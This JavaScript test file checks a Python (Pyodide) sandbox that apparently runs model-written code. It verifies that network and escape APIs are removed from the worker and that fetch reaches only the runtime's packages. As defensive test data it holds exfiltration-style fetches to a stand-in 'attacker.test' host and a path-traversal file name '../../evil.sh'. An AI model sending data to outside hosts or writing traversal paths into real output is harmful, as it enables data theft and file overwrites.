// ==============================================================
// The Python sandbox — checks
//
// Two halves, both loaded from the REAL source:
//
//  - src/workers/python.js, run in a VM standing in for a worker, with a
//    stand-in runtime. Holds that before any model code can run, every way
//    out of the worker is gone, and fetch reaches only the runtime's own
//    packages.
//  - src/core/sandbox/pyodide.js, run with a stand-in Worker. Holds that the
//    worker is started so that it carries the page's policy, that one job
//    runs at a time, that a job running too long is stopped and the next one
//    gets a fresh worker, and that nothing the worker sends is trusted as a
//    path.
//
// Neither half runs Python; the headless-browser probe does that with the
// real runtime.
//
// Run with: npm run check:python-sandbox
// ==============================================================
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import vm from 'node:vm';

const here = dirname(fileURLToPath(import.meta.url));
const root = join(here, '..', '..');
const workerSrc = readFileSync(join(root, 'src', 'workers', 'python.js'), 'utf8');
const loaderSrc = readFileSync(join(root, 'src', 'core', 'sandbox', 'pyodide.js'), 'utf8');

let pass = 0;
let fail = 0;
function ok(label, cond, detail = '') {
  if (cond) { pass++; console.log(`  ok    ${label}`); }
  else { fail++; console.log(`  FAIL  ${label}${detail ? ' — ' + detail : ''}`); }
}
const tick = () => new Promise((r) => setTimeout(r, 1));

// ── The worker ────────────────────────────────────────────────────────────

/** A worker global with every way out a real one has, and a fake runtime. */
function workerScope({ loadFails = false } = {}) {
  const fetched = [];
  const posted = [];
  const files = new Map();
  const scope = {};
  Object.assign(scope, {
    console: { warn() {}, log() {} }, URL, TypeError, Error, Promise, Object, String, Array,
    fetch: (url) => { fetched.push(String(url)); return Promise.resolve({ ok: true, url }); },
    XMLHttpRequest: function () {}, WebSocket: function () {}, EventSource: function () {},
    Worker: function () {}, SharedWorker: function () {}, BroadcastChannel: function () {},
    FontFace: function () {}, eval: () => {}, Notification: function () {},
    postMessage: (m) => posted.push(m),
  });
  scope.self = scope;
  scope.importScripts = () => {
    if (loadFails) throw new Error('the runtime could not be downloaded');
    // The real runtime declares this with `var`: a global that cannot be deleted.
    vm.runInContext('var loadPyodide;', scope);
    scope.loadPyodide = async () => ({
      loadPackage: async () => {},
      pyimport: () => ({ install: async () => {} }),
      loadPackagesFromImports: async () => {},
      runPython: (code) => (code.includes('getvalue') ? 'printed' : undefined),
      runPythonAsync: async (code) => { if (code.includes('raise')) throw new Error('Traceback\nValueError: bad'); files.set('report.docx', new Uint8Array([1, 2, 3])); },
      FS: {
        mkdirTree() {},
        readdir: () => ['.', '..', ...files.keys()],
        stat: () => ({ mode: 0 }),
        isDir: () => false,
        readFile: (p) => files.get(p.replace('/output/', '')),
        unlink: (p) => files.delete(p.replace('/output/', '')),
      },
    });
  };
  vm.createContext(scope);
  // Some engines keep a worker's storage getters on its prototype rather than
  // on the global itself; model both, so the walk up the chain is exercised.
  vm.runInContext("Object.setPrototypeOf(globalThis, Object.assign(Object.create(Object.getPrototypeOf(globalThis)), { indexedDB: {}, caches: {} }));", scope);
  vm.runInContext(workerSrc, scope, { filename: 'python.js' });
  // Asked from inside, as model code would ask.
  const has = (name) => vm.runInContext(`self[${JSON.stringify(name)}] != null`, scope);
  return { scope, fetched, posted, has };
}

const RUNTIME = 'https://cdn.jsdelivr.net/pyodide/v0.26.4/full/';
const init = (w) => w.scope.onmessage({ data: { type: 'init', runtime: RUNTIME, wheels: [], allowed: [RUNTIME, 'tauri://localhost/wheels/'] } });

console.log('Before model code runs, the worker has no way out:');
{
  const w = workerScope();
  init(w);
  for (let i = 0; i < 20 && !w.posted.length; i++) await tick();
  ok('it reports ready', w.posted[0] && w.posted[0].type === 'ready', JSON.stringify(w.posted[0]));
  for (const name of ['XMLHttpRequest', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker', 'BroadcastChannel',
    'FontFace', 'importScripts', 'indexedDB', 'caches', 'eval', 'Notification', 'loadPyodide']) {
    ok(`${name} is gone`, !w.has(name));
  }
  ok('fetch is the narrowed one, and cannot be replaced', (() => {
    try { w.scope.fetch = () => 'mine'; } catch { /* strict mode would throw */ }
    return w.scope.fetch.name === 'guardedFetch';
  })());
}
{
  const w = workerScope();
  init(w);
  for (let i = 0; i < 20 && !w.posted.length; i++) await tick();
  let refused = null;
  try { await w.scope.fetch('https://attacker.test/?x=1'); } catch (e) { refused = e; }
  ok('a fetch anywhere else is refused', refused && /no network/.test(refused.message));
  refused = null;
  try { await w.scope.fetch('https://cdn.jsdelivr.net/npm/some-package/x.js'); } catch (e) { refused = e; }
  ok('even elsewhere on the runtime\'s own host', !!refused);
  refused = null;
  try { await w.scope.fetch({ url: 'https://attacker.test/' }); } catch (e) { refused = e; }
  ok('an object is judged by its address too', !!refused);
  const before = w.fetched.length;
  await w.scope.fetch(`${RUNTIME}numpy.whl`);
  await w.scope.fetch('tauri://localhost/wheels/x.whl');
  // The runtime asks for its own binaries with a URL object, not a string.
  await w.scope.fetch(new URL(`${RUNTIME}pyodide.asm.wasm`));
  ok('its own packages still load, however the address is given', w.fetched.length === before + 3);
  refused = null;
  try { await w.scope.fetch(new URL('https://attacker.test/')); } catch (e) { refused = e; }
  ok('and a URL object elsewhere is refused like a string', !!refused);
}
{
  const w = workerScope({ loadFails: true });
  init(w);
  for (let i = 0; i < 20 && !w.posted.length; i++) await tick();
  ok('a runtime that will not load says so, rather than running unguarded', w.posted[0] && w.posted[0].type === 'failed' && /downloaded/.test(w.posted[0].message));
}

console.log('\nA run hands back what it printed and the files it wrote:');
{
  const w = workerScope();
  init(w);
  for (let i = 0; i < 20 && !w.posted.length; i++) await tick();
  w.scope.onmessage({ data: { type: 'run', id: 7, code: 'print(1)' } });
  for (let i = 0; i < 20 && w.posted.length < 2; i++) await tick();
  const r = w.posted[1];
  ok('the answer names its job', r && r.type === 'result' && r.id === 7);
  ok('with what was printed', r && r.stdout === 'printed');
  ok('and the file, which is removed from the sandbox once handed over', r && r.files.length === 1 && r.files[0].name === 'report.docx');
  w.scope.onmessage({ data: { type: 'run', id: 8, code: 'raise ValueError("bad")' } });
  for (let i = 0; i < 20 && w.posted.length < 3; i++) await tick();
  ok('an exception is reported as the error, not thrown', w.posted[2] && /ValueError/.test(w.posted[2].error));
  const n = w.posted.length;
  const fresh = workerScope();
  fresh.scope.onmessage({ data: { type: 'run', id: 1, code: 'print(1)' } });
  await tick();
  ok('nothing runs before the worker is ready', fresh.posted.length === 0 && w.posted.length === n);
}

// ── The page side ─────────────────────────────────────────────────────────

function loaderPage({ answer = 'ready' } = {}) {
  const workers = [];
  class FakeWorker {
    constructor(url) {
      this.url = url; this.terminated = false; this.sent = []; workers.push(this);
    }
    postMessage(m) {
      this.sent.push(m);
      if (m.type === 'init') setTimeout(() => this.onmessage && this.onmessage({ data: answer === 'ready' ? { type: 'ready' } : { type: 'failed', message: 'no network' } }), 1);
      if (m.type === 'run' && !/HANG/.test(m.code)) {
        setTimeout(() => this.onmessage && this.onmessage({ data: {
          type: 'result', id: m.id, stdout: 'out', stderr: '', error: null,
          files: [{ name: '../../evil.sh', data: new Uint8Array([1]) }, { name: 'ok.pdf', data: new Uint8Array([2]) }, { name: 5, data: 'x' }],
        } }), 1);
      }
    }
    terminate() { this.terminated = true; }
  }
  const blobs = [];
  const sandbox = {
    window: {}, location: { origin: 'tauri://localhost' }, setTimeout, clearTimeout, Promise, Uint8Array, JSON, String, Math, Array, Map,
    Blob: class { constructor(parts) { blobs.push(parts.join('')); } },
    URL: { createObjectURL: () => 'blob:tauri://localhost/1', revokeObjectURL: () => {} },
    Worker: FakeWorker,
  };
  vm.createContext(sandbox);
  vm.runInContext(loaderSrc, sandbox, { filename: 'pyodide.js' });
  return { P: sandbox.window.HCPyodide, workers, blobs };
}

console.log('\nThe page starts the worker so it carries the page\'s policy:');
{
  const { P, workers, blobs } = loaderPage();
  const r = await P.run('print(1)');
  ok('from a blob that loads the worker file', workers[0].url.startsWith('blob:') && blobs[0].includes("importScripts(\"tauri://localhost/workers/python.js\")"));
  const initMsg = workers[0].sent.find((m) => m.type === 'init');
  ok('allowed to fetch only the runtime and the app\'s own wheels', JSON.stringify(initMsg.allowed) === JSON.stringify([P.RUNTIME_URL, 'tauri://localhost/wheels/']));
  ok('the answer comes back', r.stdout === 'out' && r.error === null);
  ok('a file name is a name, never a path', r.files.map((f) => f.name).join() === '.._.._evil.sh,ok.pdf');
  ok('and something that is not a file is dropped', r.files.length === 2);
}
{
  const { P, workers } = loaderPage();
  await P.run('print(1)');
  const w = workers[0];
  w.onmessage({ data: { type: 'result', id: 999, stdout: 'forged', files: [] } });
  const next = await P.run('print(2)');
  ok('a message for no job it asked for changes nothing', next.stdout === 'out');
}

console.log('\nA run that goes on too long is stopped, and the next one starts fresh:');
{
  const { P, workers } = loaderPage();
  const slow = await P.run('while True: pass  # HANG', { timeoutMs: 20 });
  ok('it answers with an error the model can act on', /was stopped/.test(slow.error) && slow.files.length === 0);
  ok('the worker is terminated', workers[0].terminated);
  const after = await P.run('print(1)');
  ok('the next run gets a new worker and works', workers.length === 2 && after.stdout === 'out');
}
{
  const { P, workers } = loaderPage();
  const [a, b] = await Promise.all([P.run('print(1)'), P.run('print(2)')]);
  const runs = workers[0].sent.filter((m) => m.type === 'run');
  ok('two runs asked at once go one after the other', a.stdout === 'out' && b.stdout === 'out' && runs.length === 2 && runs[0].id < runs[1].id);
}
{
  const { P, workers } = loaderPage({ answer: 'failed' });
  let err = null;
  try { await P.run('print(1)'); } catch (e) { err = e; }
  ok('a runtime that cannot start is reported', err && /no network/.test(err.message) && /unavailable for the rest of this session/.test(err.message));
  err = null;
  try { await P.run('print(1)'); } catch (e) { err = e; }
  ok('and not retried for the rest of the session', !!err && workers.length === 1);
}

console.log('\nThe worker never loads into the page:');
{
  const boot = readFileSync(join(root, 'src', 'boot.js'), 'utf8');
  const page = readFileSync(join(root, 'src', 'index.html'), 'utf8');
  ok('boot.js does not load it', !/workers\/python\.js/.test(boot));
  ok('index.html does not load it', !/workers\/python\.js/.test(page));
  const app = readFileSync(join(root, 'src', 'js', 'app.js'), 'utf8');
  ok('execute_python runs through the worker', /await window\.HCPyodide\.run\(code\)/.test(app));
  ok('and nothing in the page runs Python itself', !/runPython|loadPyodide|getRuntime\(/.test(app));
}

console.log(`\n${pass} passed, ${fail} failed  (Python sandbox)`);
process.exit(fail ? 1 : 0);
